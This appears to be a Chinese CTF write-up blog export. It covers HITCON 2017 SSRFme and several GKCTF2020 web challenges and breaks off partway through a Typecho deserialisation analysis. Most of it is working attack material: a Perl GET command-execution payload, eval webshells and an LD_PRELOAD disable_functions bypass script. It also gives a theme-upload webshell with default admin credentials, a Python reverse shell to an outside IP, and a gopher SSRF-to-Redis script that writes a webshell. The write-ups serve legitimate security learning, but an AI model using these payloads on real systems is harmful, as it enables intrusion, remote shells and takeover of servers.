<p>参考文章：<br><a href="https://www.twblogs.net/a/5eac12af6052e15026732da5" target="_blank" rel="noopener">https://www.twblogs.net/a/5eac12af6052e15026732da5</a><br><a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/" target="_blank" rel="noopener">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
<h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">        $http_x_headers = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $http_x_headers[<span class="number">0</span>];</span><br><span class="line">    &#125;	<span class="comment">#如果存在x-Forwarded-For头，将其打散成数组，将第一个值给$_SERVER['REMOTE_ADDR']</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);	<span class="comment">#改变目录</span></span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line"><span class="comment">#escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的</span></span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);	<span class="comment">#返回路径信息</span></span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>pathinfo例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(pathinfo(<span class="string">"/testweb/test.txt"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">[dirname] =&gt; /testweb</span><br><span class="line">[basename] =&gt; test.txt</span><br><span class="line">[extension] =&gt; txt</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>basename() 函数返回路径中的文件名部分<br>写个例子简单测试一下最终是将文件写入哪个文件夹的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'$info='</span>.$info;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'$dir='</span>.$dir;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'basename($info["basename"])='</span>.basename($info[<span class="string">"basename"</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589618257419.png" alt="1589618257419"></p>
<p>可以看到是写入输入路径的<code>basename</code>中，所以直接</p>
<p>解题思路<br>首先会先进入<code>sandbox/.md5(orange110.187.162.194)</code>文件夹也就是<code>sandbox/431d3eac52ea5609413b3e82cb792bf3</code>，然后执行一个“GET +我们传入的url参数” 这个命令。最后把执行的命令写入我们传入以我们传入的filename为文件名的文件内</p>
<p>我们可以读取文件</p>
<blockquote>
<p>?url=/etc/passwd&amp;filename=a</p>
<p>sandbox/431d3eac52ea5609413b3e82cb792bf3/a</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589619733626.png" alt="1589619733626"></p>
<blockquote>
<p>?url=/&amp;filename=b</p>
<p>sandbox/431d3eac52ea5609413b3e82cb792bf3/b</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589619779798.png" alt="1589619779798"></p>
<p>发现了一个readflag，一般都是需要执行它来得到flag</p>
<p>这里还有一个<strong>GET的命令执行漏洞</strong><br>perl的feature，在open下可以执行命令。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">➜  test cat test.pl</span><br><span class="line">open(FD, <span class="string">"whoami|"</span>);</span><br><span class="line"><span class="keyword">print</span> &lt;FD&gt;;</span><br><span class="line">➜  test perl test.pl</span><br><span class="line">moxiaoxi</span><br><span class="line">➜  test</span><br></pre></td></tr></table></figure>

<p>在open下，如果perl的第二个参数（path）可控，我们就能进行任意代码执行。</p>
<p>而GET对协议处理部分调用的是 <code>/usr/share/perl5/LWP/Protocol</code>下的各个pm模块，通过查询可以发现在file.pm中，path参数是完全可控的。</p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># URL OK, look at file</span></span><br><span class="line">my $path  = $url-&gt;file;</span><br><span class="line"></span><br><span class="line"><span class="comment"># test file exists and is readable</span></span><br><span class="line">unless (-e $path) &#123;</span><br><span class="line"><span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">              <span class="string">"File `$path' does not exist"</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment"># read the file</span></span><br><span class="line"><span class="keyword">if</span> ($method ne <span class="string">"HEAD"</span>) &#123;</span><br><span class="line">open(F, $path) <span class="keyword">or</span> <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">    HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">           <span class="string">"Cannot read file '$path': $!"</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里多了一个限制条件，就是file.pm会先判断文件是否存在。若存在，才会触发最终的代码执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">➜  test GET <span class="string">'file:id|'</span></span><br><span class="line">➜  test touch <span class="string">'id|'</span></span><br><span class="line">➜  test GET <span class="string">'file:id|'</span></span><br><span class="line">uid=<span class="number">1000</span>(moxiaoxi) gid=<span class="number">1000</span>(moxiaoxi) groups=<span class="number">1000</span>(moxiaoxi),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">108</span>(lpadmin),<span class="number">124</span>(sambashare)</span><br></pre></td></tr></table></figure>

<p>那么，最终的payload就很简单了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 新建一个bash%20-c%20/readflag|文件</span><br><span class="line">?url=xxx&amp;filename=|/readflag</span><br><span class="line">2. open文件，并触发命令执行，执行readflag，并将数据写入flag</span><br><span class="line">/?url=file:|/readflag&amp;filename=flag</span><br><span class="line">3. 访问sandbox下的flag，获得flag</span><br><span class="line">/sandbox/431d3eac52ea5609413b3e82cb792bf3/flag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589620353999.png" alt="1589620353999"></p>
<p>参考文章：<a href="http://momomoxiaoxi.com/2017/11/08/HITCON/#ssrfme" target="_blank" rel="noopener">http://momomoxiaoxi.com/2017/11/08/HITCON/#ssrfme</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF&amp;&amp;WHUCTF</title>
    <url>/2020/05/29/GKCTF--WHUCTF/</url>
    <content><![CDATA[<h1 id="GKCTF-amp-amp-WHUCTF"><a href="#GKCTF-amp-amp-WHUCTF" class="headerlink" title="GKCTF&amp;&amp;WHUCTF"></a>GKCTF&amp;&amp;WHUCTF</h1><p><strong>[GKCTF2020]CheckIN</strong><br>知识点：绕过disable_function</p>
<p><strong>[GKCTF2020]老八小超市儿</strong><br>知识点：ShopXO v1.8.0</p>
<p><strong>[GKCTF2020]cve版签到</strong><br>知识点：cve-2020-7066</p>
<p><strong>[GKCTF2020]Ez三剑客-EzWeb</strong><br>知识点：ssrf打redis</p>
<p><strong>[GKCTF2020]Ez三剑客-EzTypecho</strong><br>知识点：Typecho1.1反序列化漏洞</p>
<p><strong>[GKCTF2020]Ez三剑客-EzNode</strong><br>知识点：saferEval`沙箱逃逸</p>
<p><strong>Easy_ sqli</strong><br>知识点：bool盲注</p>
<p><strong>ezphp</strong><br>知识点：/^23333$/`参数换行污染、字符逃逸、md5碰撞</p>
<p><strong>ezcmd</strong><br>知识点：命令执行绕过</p>
<p><strong>ezinclude</strong><br>知识点：文件包含，日志包含</p>
<p><strong>Easy_ unserialize</strong><br>知识点：反序列化</p>
<a id="more"></a>

<h1 id="GKCTF"><a href="#GKCTF" class="headerlink" title="GKCTF"></a>GKCTF</h1><p>比赛时间5月24日</p>
<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>

<p>代码很简单，通过Ginkgo传参<br>查看phpinfo();禁用了很多函数<code>cGhwaW5mbygpOw==</code></p>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590286265720.png" alt="1590286265720"></p>
<p>列出flag文件<code>print_r(scandir(&#39;/&#39;));</code></p>
<blockquote>
<p>cHJpbnRfcihzY2FuZGlyKCcvJykpOw==</p>
</blockquote>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590286317933.png" alt="1590286317933"></p>
<p>highlight_file(‘/readflag’)为一个二进制文件，这里要我们执行<code>./readflag</code></p>
<p><strong>猜测应该是绕过disable_function</strong><br>先构造一个shell，这必须加分号<code>;</code>不然执行不了，当时这里卡了一会儿</p>
<blockquote>
<p>eval($_POST[b]);</p>
<p>ZXZhbCgkX1BPU1RbYl0pOw==</p>
</blockquote>
<p>使用蚁剑连接因为权限问题我们在蚁剑上无法上传文件到根目录，但是我们可以上传到/tmp，首先下载<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so" target="_blank" rel="noopener">bypass_disablefunc_x64.so</a>共享库文件并上传到/tmp目录下面，将其命名为123.so<br>在上传一个123.php文件，其内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">	error_log(<span class="string">""</span>,<span class="number">1</span>,<span class="string">""</span>,<span class="string">""</span>);	<span class="comment">#当mail函数被禁用的时候可以使用error_log函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/29/GKCTF--WHUCTF/1590290172653.png" alt="1590290172653"></p>
<p>首先要包含/tmp/123.php文件<br>即先构造：<code>var_dump(eval($_GET[c]));</code>直接包含也可以<br>最后执行：</p>
<blockquote>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">Ginkgo=dmFyX2R1bXAoZXZhbCgkX0dFVFtjXSkpOw==&amp;c=<span class="keyword">include</span>(<span class="string">'/tmp/123.php'</span>);&amp;cmd=.<span class="regexp">/../</span>..<span class="regexp">/../</span>readflag&amp;outpath=<span class="regexp">/tmp/</span><span class="number">123</span>.txt&amp;sopath=<span class="regexp">/tmp/</span><span class="number">123</span>.so</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590290289429.png" alt="1590290289429"></p>
<p><a href="https://mayi077.gitee.io/2020/02/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/" target="_blank" rel="noopener"><strong>参考文章</strong></a></p>
<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p>这是一个ShopXO v1.8.0，百度找到一个后台getshell<br>先使用shopxo的默认账号密码进行登录：admin     shopxo，admin.php</p>
<p><strong>getshell</strong></p>
<p>1.在后台找到应用中心-应用商店-主题，然后下载默认主题。</p>
<p>2.下载下来的主题是一个安装包，然后把shell（php马子）放到压缩包的default_static_ 目录下<br><img src="/2020/05/29/GKCTF--WHUCTF/1590292660642.png" alt="1590292660642"></p>
<p>3.回到网页上，找到网站管理-主题管理-主题安装<br><img src="/2020/05/29/GKCTF--WHUCTF/1590292710140.png" alt="1590292710140"></p>
<p>访问<code>/public/static/index/default/shell.php</code>–&gt;getshell</p>
<p>但是flag在根目录下，需要提权</p>
<p><strong>提权</strong><br>先反弹shell，在根目录下创建一个PHP文件，这里要buu内网靶机<br>先写一个shell.php<code>&lt;?php eval(system($_POST[a]));?&gt;</code><br>访问shell.php<br>使用python反弹：</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">a=python -c 'import <span class="keyword">socket</span>,subprocess,os;s=<span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM);s.connect((<span class="string">"174.1.125.206"</span>,<span class="number">7777</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进入交互模式：</span><br><span class="line">python -c 'import pty;pty.spawn(<span class="string">"/bin/bash"</span>)'</span><br></pre></td></tr></table></figure>

<p>里面有一个auto.sh，查看内容可以发现/var/mail/makeflaghint.py，该文件具有root权限<br><img src="/2020/05/29/GKCTF--WHUCTF/1590323596848.png" alt="1590323596848"></p>
<p>并且每过一段时间便会以root权限执行，我们可以修改文件内容来达到读取flag的目的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">'cat /root/flag &gt; /flag.hint'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/29/GKCTF--WHUCTF/1590325066866.png" alt="1590325066866"></p>
<p>这里也没有提权，搞了一上午，改了文件居然手动执行，被自己蠢到了</p>
<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066</strong></p>
<blockquote>
<p>PHP（PHP：Hypertext Preprocessor，PHP：超文本预处理器）是PHPGroup和开放源代码社区的共<br>同维护的一种开源的通用计算机脚本语言。该语言主要用于Web开发，支持多种数据库及操作系统。<br>PHP 7.3版本中‘get_headers()’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。             </p>
</blockquote>
<p>点击[View CTFHub]跳转到<code>www.ctfhub.com</code><br>之后用%00截断访问本地提示要以123结尾<br><img src="/2020/05/29/GKCTF--WHUCTF/1590368031422.png" alt="1590368031422"></p>
<p>改为127.0.0.123即可</p>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590367917798.png" alt="1590367917798"></p>
<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p>考点：<code>ssrf redis</code></p>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590541454631.png" alt="1590541454631"></p>
<p>一眼看上去先考虑ssrf，但是过滤了file等协议，不能读取文件。右键查看源码<code>?secrect</code>，访问之得到ip<br><img src="/2020/05/29/GKCTF--WHUCTF/1590541522775.png" alt="1590541522775"></p>
<p>可以正常访问<br><img src="/2020/05/29/GKCTF--WHUCTF/1590541773708.png" alt="1590541773708"></p>
<p>使用burp爆破一下端口<br><img src="/2020/05/29/GKCTF--WHUCTF/1590541992280.png" alt="1590541992280"></p>
<p>在<code>173.232.160.11</code>发现提示，之后根据提示爆破端口</p>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590542900636.png" alt="1590542900636"></p>
<p>发现6379端口，可以通过ssrf攻击redis，<br>网上搜索一个<a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener">绝对路径写shell</a>的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.232.160.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]				<span class="comment">#构造redis命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/29/GKCTF--WHUCTF/1590543327304.png" alt="1590543327304"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher://173.232.160.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<p>将上面的payload通过url提交，访问</p>
<blockquote>
<p>index.php?url=173.232.160.11/shell.php?cmd=system(‘cat&lt;/flag’);&amp;submit=提交</p>
</blockquote>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590544309114.png" alt="1590544309114"></p>
<h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><p>考点：Typecho1.1反序列化漏洞<br>这里可以直接网上搜索payload打<br><strong>分析：</strong></p>
<p>参考文章：<a href="http://www.tomyxy.com/index.php/archives/3.html?replyTo=4" target="_blank" rel="noopener">http://www.tomyxy.com/index.php/archives/3.html?replyTo=4</a></p>
<p>install.php229-235行找到一个unserialize函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">					<span class="comment">//</span></span><br><span class="line">					<span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">'no, you can\'t unserialize it without session QAQ'</span>);&#125;</span><br><span class="line">                    $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">                    Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">                    $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">                    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">                    Typecho_Db::set($db);</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>若要执行到这个位置，则首先要满足前面59-76行的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</span><br><span class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是<code>$_GET[&#39;finish&#39;]</code>不为空，其次是<code>referer</code>需要是本站<br>跟进unserialize中的Typecho_Cookie类的get方法，在<code>/var/Typecho/Cookie.php</code>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该处的代码主要是给$vaule赋值，可以通过cookie也可以通过post传入我们的<code>__typecho_config</code></p>
<p>回到第一段代码中，在unserialize之后实例化了一个<code>Typecho_Db</code>类，在<code>/var/Typecho/Db.php</code>中跟进，发现其中有一个<code>__construct</code>魔术方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 $adapterName = ‘Typecho_Db_Adapter_’ . $adapterName;将变量与字符串连接，这时候便调用了魔术方法__toString<br>全局搜索，发现<code>/var/Typecho/Feed.php</code>的<code>__toStrig</code>有可以利用的地方：</p>
